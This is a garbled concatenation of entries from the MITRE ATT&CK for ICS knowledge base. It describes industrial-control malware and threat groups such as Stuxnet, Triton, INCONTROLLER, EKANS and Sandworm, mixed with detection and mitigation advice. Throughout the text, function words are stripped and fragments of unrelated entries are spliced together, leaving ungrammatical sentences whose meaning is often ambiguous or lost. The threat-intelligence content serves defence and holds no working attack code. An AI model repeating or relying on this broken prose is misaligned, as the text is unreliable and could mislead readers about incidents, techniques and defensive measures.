S7 PLCs. worm locates Siemens S7 PLCs network attempts infect them.  worm infected target attempted infect devices network, worm modules. (Citation: Spenneberg, Ralf, Maik Brggemann, Hendrik Schwartke March 2016) (Citation: Spenneberg, Ralf 2016)  [VPNFilter](https://attack.mitre.org/software/S1010) multi-stage, modular platform versatile capabilities support intelligence-collection destructive cyber attack operations. [VPNFilter](https://attack.mitre.org/software/S1010) modules packet sniffer ('ps') collect traffic passes infected device, allowing theft credentials monitoring Modbus SCADA protocols. (Citation: William Largent June 2018) (Citation: Carl Hurd March 2019) 2015 BlackEnergy malware contained component called KillDisk. KillDisk's main functionality overwrite files random data, rendering OS unbootable. (Citation: ESET BlackEnergy Jan 2016) [Triton](https://attack.mitre.org/software/S1009) attack framework built interact Triconex Safety Instrumented (SIS) controllers. (Citation: Blake Johnson, Dan Caban, Marina Krotofil, Dan Scali, Nathan Brubaker, Christopher Glyer December 2017) (Citation: Dragos December 2017) (Citation: DHS CISA February 2019) (Citation: Schneider Electric January 2018) (Citation: Julian Gutmanis March 2019) (Citation: Schneider December 2018) (Citation: Jos Wetzels January 2018) [BlackEnergy 3](https://collaborate.mitre.org/attackics/index.php/Software/S0004) malware toolkit criminal APT actors. support plug-ins including variant KillDisk. Ukrainian power grid. (Citation: Booz Allen Hamilton) [EKANS](https://collaborate.mitre.org/attackics/index.php/Software/S0017) ransomware December 2019 reported impacted operations Honda automotive production facilities.(Citation: Forbes Snake Ransomware June 2020)(Citation: MalwareByes Honda Enel Ransomware June 2020)(Citation: Dragos EKANS February 2020) EKANS hard-coded kill-list processes, including common ICS software platforms Proficy historian, Honeywell HMIWeb).(Citation: Dragos EKANS February 2020) malware discovers processes target system, stop, encrypt, rename process prevent program restarting. malware confused “Snake” malware Turla group. ICS processes documented malware’s kill-list defined MEGACORTEX software.(Citation: FireEye OT Ransomware July 2020)(Citation: Pylos January 2020)(Citation: Dragos EKANS June 2020)The ransomware initially reported “Snake”, however, avoid confusion unrelated Turla APT security researchers spelled EKANS. [ACAD/Medre.A](https://attack.mitre.org/software/S1000) worm steals operational information. worm collects AutoCAD files drawings. [ACAD/Medre.A](https://attack.mitre.org/software/S1000) capability industrial espionage.(Citation: ESET) [INCONTROLLER](https://attack.mitre.org/software/S1045) custom malware includes multiple modules tailored ICS devices technologies, including Schneider Electric Omron PLCs OPC UA, Modbus, CODESYS protocols. [INCONTROLLER](https://attack.mitre.org/software/S1045) ability discover specific devices, download logic devices, exploit platform-specific vulnerabilities. September 2022, security researchers assessed [INCONTROLLER](https://attack.mitre.org/software/S1045) developed CHERNOVITE.(Citation: CISA-AA22-103A)(Citation: Brubaker-Incontroller)(Citation: Dragos-Pipedream)(Citation: Schneider-Incontroller)(Citation: Wylie-22)  Monitor ICS asset application logs alarm settings changed, assets produce logs. host-based allowlists prevent devices accepting connections unauthorized systems. example, allowlists ensure devices connect master stations management/engineering workstations. (Citation: Department Homeland Security September 2016)
 Limit privileges user accounts authorized administrators change service configurations.
 Monitor authentication attempt user abuse credentials existing accounts gaining Initial Access, Persistence, Privilege Escalation, Defense Evasion. Authenticate connections software devices prevent unauthorized systems accessing protected management functions.
 field controllers require users authenticate remote local management sessions. authentication mechanisms support [Account Policies](https://attack.mitre.org/mitigations/M0936), [Password Policies](https://attack.mitre.org/mitigations/M0927), [User Account Management](https://attack.mitre.org/mitigations/M0918). Monitor unexpected network share access, files transferred shares network protocols Server Message Block (SMB). patch management process implemented check unused dependencies, unmaintained vulnerable dependencies, unnecessary features, components, files, documentation.
 [Dragonfly](https://attack.mitre.org/groups/G0035) utilized watering hole attacks energy sector websites injecting redirect iframe deliver [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) [Trojan.Karagany](https://attack.mitre.org/software/S0094). (Citation: Symantec Security Response July 2014) Restrict untrusted unknown libraries, remote unknown DLLs.
 Perform audits scans systems, permissions, insecure software, insecure configurations, etc. identify potential weaknesses. Perform periodic integrity checks device validate correctness firmware, software, programs, configurations. Integrity checks, typically include cryptographic hashes digital signatures, compared valid states, events device reboots, program downloads, program restarts.
 [KillDisk](https://attack.mitre.org/software/S0607) erases master boot record (MBR) logs, leaving unusable. (Citation: Booz Allen Hamilton) Perform integrity checks firmware uploading device. Utilize cryptographic hashes verify firmware tampered comparing trusted hash firmware. trusted data sources vendor site) third-party verification service.
 [Bad Rabbit](https://attack.mitre.org/software/S0606) initially infected networks, exploit (particularly SMBv1-targeting MS17-010 vulnerability) spread industrial networks. (Citation: Joe Slowik April 2019) [INCONTROLLER](https://attack.mitre.org/software/S1045) remotely read OCP structure devices.(Citation: CISA-AA22-103A)  [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) payload gathers server includes CLSID, server name, Program ID, OPC version, vendor information, running state, count, server bandwidth. helps role server control process. (Citation: ICS-CERT August 2018) (Citation: Daavid Hentunen, Antti Tikkanen June 2014) Authenticate connections software devices prevent unauthorized systems accessing protected management functions.
 Monitor suspicious descendant process spawning Office productivity software.(Citation: Elastic - Koadiac Detection EQL) context adversary procedures background [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Monitor asset alarms identify loss communications. correlating alarms data sources traffic blocked, network traffic. alternative methods communicating outstations exist alarms visible messages serial ports blocked. Application control prevent running executables masquerading files.
 Develop robust cyber threat intelligence capability determine types levels threat software exploits 0-days organization.
 Devices authenticate messages master outstation assets.
 Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns monitor anomalies files initiate connections respective protocol(s)). encryption firmware considered prevent adversaries identifying vulnerabilities firmware.
 Monitor newly constructed services/daemons attempt manipulate features artifacts legitimate benign users security tools. field controllers require users authenticate remote local management sessions. authentication mechanisms support [Account Policies](https://attack.mitre.org/mitigations/M0936), [Password Policies](https://attack.mitre.org/mitigations/M0927), [User Account Management](https://attack.mitre.org/mitigations/M0918). Monitor executed commands arguments details network configuration settings, IP MAC addresses, systems access discovery remote systems. monitor executed commands arguments attempt listing network connections compromised accessing remote systems querying network. acquired Windows management tools [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) [PowerShell](https://attack.mitre.org/techniques/T1059/001). [APT33](https://attack.mitre.org/groups/G0064) utilize backdoors capable capturing screenshots installed system. (Citation: Jacqueline O'Leary al. September 2017)(Citation: Junnosuke Yagi March 2017) [Bad Rabbit](https://attack.mitre.org/software/S0606) ransomware spreads drive-by attacks insecure websites compromised. target visiting legitimate website, malware dropper downloaded threat actors infrastructure. (Citation: Orkhan Mamedov, Fedor Sinitsyn, Anton Ivanov October 2017) Check integrity existing BIOS EFI determine vulnerable modification. Trusted Platform Module technology. (Citation: N/A)Move system's root trust hardware prevent tampering SPI flash memory. (Citation: ESET Whitepapers September 2018)Technologies Intel Boot Guard assist this. (Citation: Intel)
 Monitor asset application logs task parameters changed. Provide alternative method sending critical commands message outstations, include radio/cell communication send messages field technician physically performs control function.
 Monitor ICS management protocols functions change asset’s operating mode. [INCONTROLLER](https://attack.mitre.org/software/S1045) remotely send commands malicious agent uploaded Omron PLCs HTTPS.(Citation: CISA-AA22-103A)  Monitor ICS automation network protocols functions reading operational process “Read” function codes protocols DNP3 Modbus). cases, multiple monitor operational process’ state, typically operational environment. Monitor operating mode checked unexpected ways. techniques enable spoofing reporting message. monitoring [Rogue Master](https://attack.mitre.org/techniques/T0848) [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T0830) activity precede technique. Protocols device management authenticate network messages prevent unauthorized changes.
 Monitor industrial process history data events correspond command message functions, setpoint modification status key devices. detect technique’s execution, provide additional evidence technique complement detections. [Stuxnet](https://attack.mitre.org/software/S0603) renames s7otbxdx.dll, dll responsible handling communications PLC. replaces dll file version intercept calls access PLC. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) Ensure proper registry permissions inhibit adversaries disabling interfering critical services.
 [ALLANITE](https://attack.mitre.org/groups/G1000) utilized credentials collected phishing watering hole attacks. (Citation: Dragos) [APT33](https://attack.mitre.org/groups/G0064) spear phishing emails links application files, embedded malicious code. (Citation: Jacqueline O'Leary al. September 2017) [APT33](https://attack.mitre.org/groups/G0064) conducted targeted spear phishing campaigns U.S. government agencies private sector companies. (Citation: Andy Greenburg June 2019) Devices authenticate messages master outstation assets.
 Ensure proper network segmentation level corporate resources control process environment.
 Ensure SIS segmented operational networks prevent targeted additional adversarial behavior.
 Authenticate access field controllers authorizing access to, modification of, device's state, logic, programs. Centralized authentication techniques manage field controller accounts ICS.
 host-based allowlists prevent devices accepting connections unauthorized systems. example, allowlists ensure devices connect master stations management/engineering workstations. (Citation: Department Homeland Security September 2016)
 Authenticate connections software devices prevent unauthorized systems accessing protected management functions.
 Ukraine 2015 incident, [Sandworm Team](https://attack.mitre.org/groups/G0034) spearphishing attachments energy distribution companies malware gain access victim systems. (Citation: UNITED DISTRICT COURT WESTERN DISTRICT PENNSYLVANIA October 2020) Monitor firmware observable operational alarms devices. Monitor asset alarms identify loss communications. correlating alarms data sources traffic blocked, network traffic. alternative methods communicating outstations exist alarms visible reporting messages blocked.   Audit domain local accounts permission levels routinely situations adversary gain wide access stolen privileged account credentials. (Citation: 2017) (Citation: August 2018)These audits identify default accounts enabled, local accounts created authorized. Follow practices design administration enterprise network limit privileged account administrative tiers. (Citation: February 2019)
 Program uploads observable ICS management protocols file transfer protocols. Note protocol functions program uploads occur. ICS protocols understood, option examine network traffic program files signature-based tools. encrypting process, [EKANS](https://attack.mitre.org/software/S0605) kills process matches processes defined kill-list.  (Citation: Daniel Kapellmann Zafra, Keith Lunden, Nathan Brubaker, Jeremy Kennelly July 2020) (Citation: Daniel Kapellmann Zafra, Keith Lunden, Nathan Brubaker, Jeremy Kennelly July 2020) EKANS utilizes netsh commands implement firewall rules blocks remote communication device. (Citation: Ben Hunter Fred Gutierrez July 2020) Monitor loss network communications, technique used. Protocols device management authenticate network messages prevent unauthorized changes.
 Monitor firmware observable operational alarms devices. [Triton](https://attack.mitre.org/software/S1009)'s imain.bin payload takes commands TsHi.ExplReadRam(Ex), TsHi.ExplWriteRam(Ex) TsHi.ExplExec functions perform operations controller memory registers syscalls written PowerPC shellcode. (Citation: Jos Wetzels January 2018) Unauthorized connections prevented statically defining hosts ports automation protocol connections.
 Monitor executed commands arguments attempt screen captures desktop gather operation. Protocols control functions provide authenticity MAC functions digital signatures. not, utilize bump-in-the-wire devices VPNs enforce communication authenticity devices capable supporting legacy controllers, RTUs).
 Monitor newly executed processes services designed accept remote graphical connections, RDP VNC. [Remote Services](https://attack.mitre.org/techniques/T0886) [Valid Accounts](https://attack.mitre.org/techniques/T0859) access host’s GUI. Monitor ICS automation network protocols asset Firmware Update Mode. Monitor command-line arguments script execution subsequent behavior. Actions network Discovery, Collection, scriptable post-compromise behaviors indicators detection leading source script. Scripts perform actions effects generate events, depending types monitoring used.  [Dragonfly 2.0](https://attack.mitre.org/groups/G0035) Phishery tool kit conduct spear phishing attacks gather credentials. (Citation: Symantec September 2017) (Citation: Sean Baird, Earl Carter, Erick Galinkin, Christopher Marczewski & Joe Marshall July 2017) [Dragonfly 2.0](https://attack.mitre.org/groups/G0035) conducted targeted spear phishing campaign multiple electric utilities North America. (Citation: Dragos Threat Intelligence September 2018) (Citation: Dragos Threat Intelligence 2018)  technique effectively mitigated against, controls assets processes lead technique.
 Devices remote management firmware require authentication allowing changes. authentication mechanisms support [Account Policies](https://attack.mitre.org/mitigations/M0936), [Password Policies](https://attack.mitre.org/mitigations/M0927), [User Account Management](https://attack.mitre.org/mitigations/M0918). Provide operators redundant, out-of-band communication support monitoring control operational processes, recovering network outage  (Citation: National Institute Standards Technology April 2013). Out-of-band communication utilize diverse systems technologies minimize common failure modes vulnerabilities communications infrastructure. example, wireless networks 3G, 4G) provide diverse redundant delivery data.
 Monitor log files process execution command-line scripting activities. gaining additional insight adversaries' actions native processes custom tools. monitor loading modules specific languages. Segment operational network systems restrict access critical functions predetermined management systems. (Citation: Department Homeland Security September 2016) (Citation: N/A)
 [INCONTROLLER](https://attack.mitre.org/software/S1045) send custom Modbus commands write register values Schneider PLCs.(Citation: CISA-AA22-103A) 

[INCONTROLLER](https://attack.mitre.org/software/S1045) send write tag values OPC servers.(Citation: CISA-AA22-103A)  Ensure browsers plugins updated prevent exploit phase technique. modern browsers security features enabled.
 link visited user, block unknown unused files transit default downloaded policy suspicious sites practice prevent vectors, .scr, .exe, .pif, .cpl, etc. download scanning devices analyze compressed encrypted formats, zip rar conceal malicious files.
 Monitor files update patch attempt manipulate features artifacts legitimate benign users security tools. Monitor lack operational process data identify loss communications. detect technique’s execution, provide additional evidence technique complement detections. Provide ability verify integrity control logic programs loaded controller. techniques CRCs checksums commonly used, cryptographically strong vulnerable collisions. Preferably cryptographic hash functions SHA-2, SHA-3) used. (Citation: IEC February 2019)
 [Industroyer](https://attack.mitre.org/software/S0604) IEC 61850 payload component ability discover relevant devices infected host's network subnet attempting connect port 102.(Citation: Anton Cherepanov, ESET June 2017)

[Industroyer](https://attack.mitre.org/software/S0604) OPC DA module enumerates OPC servers `ICatInformation::EnumClassesOfCategories` method `CATID_OPCDAServer20` category identifier `IOPCServer::GetStatus` identify running. [Stuxnet](https://attack.mitre.org/software/S0603) enumerates parses Data Blocks (SDB) s7blk_findfirst s7blk_findnext API calls s7otbxdx.dll. Stuxnet SDB DWORD offset 50h equal 0100CB2Ch. specifies Profibus communications processor module CP 342-5. addition, specific values searched counted: 7050h 9500h. 7050h assigned KFC750V3 appears frequency converter drive (also variable frequency drive) manufactured Fararo Paya Teheran, Iran. 9500h assigned Vacon NX frequency converter drives manufactured Vacon based Finland.(Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011)

[Stuxnet](https://attack.mitre.org/software/S0603) targeting CPUs 6ES7-315-2 (Series 300) special data block characteristics sequence 6ES7-315-2 sequence C. PLC type checked s7ag_read_szl API.(Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) Monitor device application logs firmware changes, devices produce logs. [EKANS](https://attack.mitre.org/software/S0605) performs DNS lookup internal domain target network identify deployed intended system. (Citation: Ben Hunter Fred Gutierrez July 2020) Monitor ICS protocol connections existing assets device scanning (i.e., host connecting devices) ICS enterprise protocols ICMP, DCOM, WinRM). Analyze network data uncommon data flows protocols hosts, unexpected ports use). Processes utilizing network network communication suspicious.  Monitor alike file hashes characteristics (ex: filename) created multiple hosts.  [INCONTROLLER](https://attack.mitre.org/software/S1045) login Omron PLCs hardcoded credentials, documented CVE-2022-34151.(Citation: Wylie-22)  Monitor files disable services render services unavailable legitimate users. Regularly scan internal network services identify vulnerable services.
 [Triton](https://attack.mitre.org/software/S1009) leveraged TriStation protocol download programs Triconex Safety Instrumented System. (Citation: Jos Wetzels January 2018) Ensure users user permissions roles Identity Access Management (IAM) controls. Implement strict IAM controls prevent access systems applications, users, services require access. Implement user accounts individual enforcement non-repudiation actions.
 [REvil](https://attack.mitre.org/software/S0496) initially executes user clicks JavaScript file included phishing emails .zip attachment. (Citation: Tom Fakterman August 2019) Consult asset management systems detection systems network devices exist network. Monitor quantity files unexpected modifications user directories directories store programs OS components C:\Windows\System32).  Segment operational assets management devices based functional role process. Enabling strict isolation critical control operational control environment. (Citation: Karen Scarfone; Paul Hoffman September 2009) (Citation: Keith Stouffer 2015) (Citation: Department Homeland Security September 2016) (Citation: Dwight Anderson 2014) 
 Provide operators redundant, out-of-band communication support monitoring control operational processes, recovering network outage  (Citation: National Institute Standards Technology April 2013). Out-of-band communication utilize diverse systems technologies minimize common failure modes vulnerabilities communications infrastructure. example, wireless networks 3G, 4G) provide diverse redundant delivery data.
 inspect HTTPS traffic, captures analyzed connections domain fronting.
 [PLC-Blaster](https://attack.mitre.org/software/S1006)'s code stored OB9999. original code target untouched. OB automatically detected PLC executed. (Citation: Spenneberg, Ralf, Maik Brggemann, Hendrik Schwartke March 2016) [PLC-Blaster](https://attack.mitre.org/software/S1006) function blocks TCON TDISCON initiate destroy TCP connections arbitrary systems. Buffers received connections TRCV und TSEND function blocks. (Citation: Spenneberg, Ralf, Maik Brggemann, Hendrik Schwartke March 2016) Monitor asset logs alarms adversary unable suppress. Relevant alarms include loss communications [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T0830) activity. Monitor executed commands arguments disable services render services unavailable legitimate users. Protect files stored locally proper permissions  limit opportunities adversaries impact data storage. (Citation: National Institute Standards Technology April 2013)
 Deny direct remote access internal systems network proxies, gateways, firewalls. jump server host DMZ access control. Leverage DMZ corporate resources vendor access. (Citation: Keith Stouffer 2015)
 field controllers require users authenticate remote local management sessions. authentication mechanisms support [Account Policies](https://attack.mitre.org/mitigations/M0936), [Password Policies](https://attack.mitre.org/mitigations/M0927), [User Account Management](https://attack.mitre.org/mitigations/M0918). [ACAD/Medre.A](https://attack.mitre.org/software/S1000) collect AutoCad files drawings. drawings operational information. (Citation: ESET)
 Protocols device management authenticate network messages prevent unauthorized changes.
 Security applications behavior exploitation Windows Defender Exploit Guard (WDEG) Enhanced Mitigation Experience Toolkit (EMET) mitigate exploitation behavior. (Citation: Security Response Center August 2017)Control flow integrity checking identify software exploit occurring. (Citation: Wikipedia)Many protections depend architecture target application binary compatibility software services targeted.
 Protection devices minimal digital components prevent exposure adversarial techniques. Examples include interlocks, rupture disks, release valves, etc. (Citation: Foord, Gulland, Howard, Kellacher, Smith 2004) 
 Systems devices restrict access data potential confidentiality concerns, including tag information.
 Monitor newly executed processes execute removable media mounted initiated user. remote access tool manner laterally, additional actions occur execution, network connections Command Control network Discovery.  Monitor applications logs access attempts operational databases historians) sources operational data ICS environment. devices monitored adversary collection techniques relevant underlying technologies Windows, Linux). [Sandworm Team](https://attack.mitre.org/groups/G0034) MS-SQL server xp_cmdshell command, PowerShell execute commands. (Citation: Dragos October 2018) Authenticateconnections fromsoftware devices prevent unauthorized systems accessing protected management functions.
 Restrict root administrator access user accounts limit ability capture promiscuous traffic network common packet capture tools. (Citation: National Institute Standards Technology April 2013)
 Configure features account login attempt lockouts, specific login times, password strength requirements examples. features relate assets impact safety availability. (Citation: Keith Stouffer 2015)
 detecting collection local systems monitor executed commands arguments search collect local sources, file systems local databases, files sensitive data prior Exfiltration. Remote access tools built-in features interact Windows API gather data. Data acquired Windows management tools [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) [PowerShell](https://attack.mitre.org/techniques/T1059/001). context adversary procedures background [Data Local System](https://attack.mitre.org/techniques/T1005).

In detecting collection shared network drives monitor executed commands arguments actions collect files network share. Remote access tools built-in features interact Windows API gather location. Data acquired Windows management tools [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) [PowerShell](https://attack.mitre.org/techniques/T1059/001). context adversary procedures background [Data Network Shared Drive](https://attack.mitre.org/techniques/T1039).

In detecting collection removable media monitor executed commands arguments actions collect files system's connected removable media. example, data acquired Windows management tools [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) [PowerShell](https://attack.mitre.org/techniques/T1059/001). context adversary procedures background [Data Removable Media](https://attack.mitre.org/techniques/T1025).
 [INCONTROLLER](https://attack.mitre.org/software/S1045) CODESYS protocol remotely connect Schneider PLCs perform maintenance functions device.(Citation: Wylie-22)

[INCONTROLLER](https://attack.mitre.org/software/S1045) Telnet upload payloads execute commands Omron PLCs.	(Citation: Brubaker-Incontroller)(Citation: Dragos-Pipedream) malware HTTP-based CGI scripts cpu.fcgi, ecat.fcgi) gain administrative access device.(Citation: Wylie-22)  [Stuxnet](https://attack.mitre.org/software/S0603) copies input I/O image data blocks interval copies, forming 21 recording input area. input passed PLC peripheral. example, current valve temperature device. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) [Dragonfly 2.0](https://attack.mitre.org/groups/G0035) reported screenshots GUI ICS equipment, HMIs. (Citation: Cybersecurity & Infrastructure Security Agency March 2018) Digital signatures ensure application DLLs authentic prior execution.
 Monitor HKLM\Software\Policies\Microsoft\Windows NT\DNSClient "EnableMulticast" DWORD value. "0" LLMNR disabled. adversary access remote GUI abuse features, required HMI functions.
 [Oldsmar Treatment Plant Intrusion](https://attack.mitre.org/campaigns/C0009), threat actors raised sodium hydroxide setpoint 100 part-per-million (ppm) 11,100 ppm, normal operating levels.(Citation: Pinellas County Sheriffs Office February 2021) 2015 attack Ukrainian power grid, [Sandworm Team](https://attack.mitre.org/groups/G0034) scheduled disconnects uninterruptable power supply (UPS) systems power disconnected substations, devices shut service recovered. (Citation: Electricity Sharing Analysis Center; SANS Industrial Control Systems March 2016) Provide alternative method sending critical report messages operators, include radio/cell communication messages field technicians locally telemetry status data.
 host-based allowlists prevent devices accepting connections unauthorized systems. example, allowlists ensure devices connect master stations management/engineering workstations. (Citation: Department Homeland Security September 2016)
 Monitor device management protocols functions modify programs online edit program append events. Monitor termination processes services ICS automation protocols application software detect blocked communications. Limit access remote services centrally managed concentrators VPNs managed remote access systems.
 Monitor files (such /etc/hosts) accessed attempt listing systems IP address, hostname, logical identifier network Lateral Movement current system. Monitor application logs settings events network protocols block communications. Protect files stored locally proper permissions limit opportunities adversaries interact collect databases. (Citation: Keith Stouffer 2015) (Citation: National Institute Standards Technology April 2013)
 host-based allowlists prevent devices accepting connections unauthorized systems. example, allowlists ensure devices connect master stations management/engineering workstations. (Citation: Department Homeland Security September 2016)
 Execution prevention prevent malicious scripts accessing protected resources.
 Reduce range RF communications intended operating range possible. Propagation reduction methods include (i) reducing transmission power wireless signals, (ii) adjusting antenna gain prevent extensions organizational boundaries, (iii) employing RF shielding techniques block excessive signal propagation.  (Citation: DHS  National Urban Security Technology Laboratory April 2019)
 implementing disk encryption, engineering workstations transient assets lost, stolen, tampered with. (Citation: National Institute Standards Technology April 2013)
 [Stuxnet](https://attack.mitre.org/software/S0603) examines fields recorded DP_RECV monitor determine target operation. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) periodic reviews accounts privileges critical sensitive repositories.
 application isolation sandboxing restrict specific operating interactions access user accounts, services, calls, registry, network access. source executed script unknown.
 [REvil](https://attack.mitre.org/software/S0496) searches processes listed prc field configuration file terminates process. (Citation: McAfee Labs October 2019) Monitor network data uncommon  data flows time day, unusual source/destination address) abuse [Valid Accounts](https://attack.mitre.org/techniques/T0859) log service designed accept remote connections, RDP, Telnet, SSH, VNC. [Dragonfly 2.0](https://attack.mitre.org/groups/G0035) deleted indicators staging target devices uninstalling software, removing event logs, batch scripts, screenshots, registry keys, documents, tools brought target networks. (Citation: Cybersecurity & Infrastructure Security Agency March 2018) [PLC-Blaster](https://attack.mitre.org/software/S1006) utilizes PLC communication management API load executable Program Organization Units. (Citation: Spenneberg, Ralf, Maik Brggemann, Hendrik Schwartke March 2016) [Lazarus Group](https://attack.mitre.org/groups/G0032) observed targeting organizations spearphishing documents embedded malicious payloads. (Citation: Novetta Threat February 2016) Highly targeted spear phishing campaigns conducted U.S. electric grid company. (Citation: Eduard Kovacs March 2018) Monitor network traffic originating unknown/unexpected devices addresses.  Local network traffic metadata identify unexpected connections, including unknown/unexpected source MAC addresses connecting ports operational protocols. Also, network management protocols DHCP ARP helpful identifying unexpected devices.  [Stuxnet](https://attack.mitre.org/software/S0603) sends SQL statement creates table inserts binary table. binary hex string representation main Stuxnet DLL executable file (formed resource 210) updated configuration data block. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) Ukraine 2015 Incident, [Sandworm Team](https://attack.mitre.org/groups/G0034) harvested VPN worker credentials remotely log control networks. (Citation: Electricity Sharing Analysis Center; SANS Industrial Control Systems March 2016) (Citation: Zetter, Kim March 2016) (Citation: ICS-CERT February 2016) (Citation: John Hultquist January 2016) Deny direct remote access internal systems network proxies, gateways, firewalls. Steps periodically inventory internet accessible devices determine differs expected.
 Review vendor documents security alerts unknown overlooked default credentials existing devices
 Monitor termination processes services ICS automation protocols application software detect blocked communications. Utilize strong cryptographic techniques protocols prevent eavesdropping network communications.  (Citation: Bastille April 2017)
 Provide ability verify integrity control logic programs loaded controller. techniques CRCs checksums commonly used, cryptographically strong vulnerable collisions. Preferably cryptographic hash functions SHA-2, SHA-3) used. (Citation: IEC February 2019)
 Segment networks systems appropriately reduce access critical services communications.
 [Triton](https://attack.mitre.org/software/S1009)'s injector, inject.bin, masquerades standard compiled PowerPC program Tricon. (Citation: DHS CISA February 2019)

[Triton](https://attack.mitre.org/software/S1009) configured masquerade trilog.exe, Triconex software analyzing SIS logs.(Citation: FireEye TRITON) [Triton](https://attack.mitre.org/software/S1009) Python script capable detecting Triconex controllers network sending specific UDP broadcast packet port 1502. (Citation: DHS CISA February 2019) Network segmentation isolate infrastructure components require broad network access. mitigate, alleviate, scope MiTM activity.
 [OilRig](https://attack.mitre.org/groups/G0049) spearphishing emails malicious Excel spreadsheet attachments. (Citation: Robert Falcone, Bryan Lee 2016) Monitor newly executed processes depend user interaction, applications embed programmatic capabilities Office products scripts, installers, zip files). includes compression applications, zip files, [Deobfuscate/Decode Files Information](https://attack.mitre.org/techniques/T1140) payloads. context adversary procedures background [User Execution](https://attack.mitre.org/techniques/T1204) applicable sub-techniques. Filter protocols payloads program download activity prevent unauthorized device configurations.
 Detecting software exploitation difficult depending tools available. Software exploits succeed exploited process unstable crash. Application Firewalls detect improper inputs attempting exploitation. Monitor anomalous unexpected commands result process operation discrete write, logic device configuration, mode changes) observable asset application logs. enterprise resource planning (ERP) manufacturing server lost [Ryuk](https://attack.mitre.org/software/S0446) attack. manufacturing process rely paper existing shop floor open. (Citation: Kelly Jackson Higgins) [Flame](https://attack.mitre.org/software/S0143) built-in modules gather compromised computers. (Citation: Kevin Savage Branko Spasojevic) Monitor newly constructed files copied removable media. Monitor newly executed processes discover remote systems, ping.exe tracert.exe  , executed quick succession.(Citation: Elastic - Koadiac Detection EQL) monitoring processes engaging scanning activity connecting multiple systems correlating process creation network data. field controllers require users authenticate remote local management sessions. authentication mechanisms support [Account Policies](https://attack.mitre.org/mitigations/M0936), [Password Policies](https://attack.mitre.org/mitigations/M0927), [User Account Management](https://attack.mitre.org/mitigations/M0918). [BlackEnergy](https://attack.mitre.org/software/S0089) POST request contact external command control servers. (Citation: Booz Allen Hamilton)
 Monitor termination processes services ICS automation protocols application software detect blocked communications. inherently rely authenticity network/link layer 802.11, LTE, 802.15.4), link layer equipment lifespans protocol vulnerabilities easily patched. Provide defense-in-depth implementing authenticity application-layer protocol, network-layer VPN. (Citation: CISA March 2010)  Furthermore, ensure communication schemes provide strong replay protection, employing techniques timestamps cryptographic nonces.
 detecting collection local systems monitor API calls search local sources, file systems local databases, files sensitive data prior Exfiltration.  context adversary procedures background [Data Local System](https://attack.mitre.org/techniques/T1005). Security applications behavior exploitation Windows Defender Exploit Guard (WDEG) Enhanced Mitigation Experience Toolkit (EMET) mitigate exploitation behavior. (Citation: Security Response Center August 2017)Control flow integrity checking identify software exploit occurring. (Citation: Wikipedia)Many protections depend architecture target application binary compatibility software services targeted.
 [Industroyer](https://attack.mitre.org/software/S0604) payload DLL supplied attackers command parameter supplied main backdoors execute command commands. (Citation: Anton Cherepanov, ESET June 2017) Devices verify firmware properly signed vendor allowing installation.
 Monitor proxy protocols SOCKS, Tor, peer-to-peer protocols) tool usage Squid,  peer-to-peer software) network normal operations. monitor network data uncommon data flows. Processes utilizing network network communication suspicious. Monitor application logging, messaging, artifacts rely specific actions user gain execution. Monitor operational process data write commands excessive I/O manipulating single excessive times. detect technique’s execution, provide additional evidence technique complement detections. [Stuxnet](https://attack.mitre.org/software/S0603) calls function blocks operating running PLC. execute tasks, reading clock (SFC1) generating data blocks fly. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns monitor anomalies files initiate connections respective protocol(s)). Monitor logon activity unexpected unusual access devices Internet. Minimize exposure API calls execution code.
 Filter protocols payloads firmware activation updating activity.
 Detecting software exploitation difficult depending tools available. Software exploits succeed exploited process unstable crash. host-based allowlists prevent devices accepting connections unauthorized systems. example, allowlists ensure devices connect master stations management/engineering workstations. (Citation: Department Homeland Security September 2016)
 Monitor DLL file events, creation files loading DLLs processes designed accept remote connections, RDP, Telnet, SSH, VNC. Ensure embedded controls network devices protected access management, devices unknown default accounts gain unauthorized access.
 Ensure wireless networks require authentication devices, wireless devices authenticate network infrastructure devices (i.e., mutual authentication). defense-in-depth purposes, utilize VPNs ensure application-layer protocols authenticate device. protocols provide strong authentication IEEE 802.1X), enforce basic protections, MAC filtering, stronger cryptographic techniques available.
 Monitor executed commands arguments delete alter generated artifacts host system, including logs captured files quarantined malware. [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) ICS malware plugin relies Windows networking (WNet) discover servers, including OPC servers, reachable compromised machine network. (Citation: Julian Rrushi, Hassan Farhangi, Clay Howey, Kelly Carmichael, Joey Dabell December 2015) [INCONTROLLER](https://attack.mitre.org/software/S1045) PLCProxy module add IP route CODESYS gateway running Schneider PLCs route messages PLC devices network. malware bypass firewall rules prevent communicating devices network PLC.(Citation: Wylie-22) Host-based implementations technique utilize networking-based calls network utility commands iptables) locally intercept traffic. Monitor relevant process creation events. detecting collection local systems monitor unexpected/abnormal access files malicious collection local data, user files .pdf, .docx, .jpg, .dwg   ) local databases. context adversary procedures background [Data Local System](https://attack.mitre.org/techniques/T1005). Protocols control functions provide authenticity MAC functions digital signatures. not, utilize bump-in-the-wire devices VPNs enforce communication authenticity devices capable supporting legacy controllers, RTUs).
 encryption firmware considered prevent adversaries identifying vulnerabilities firmware.
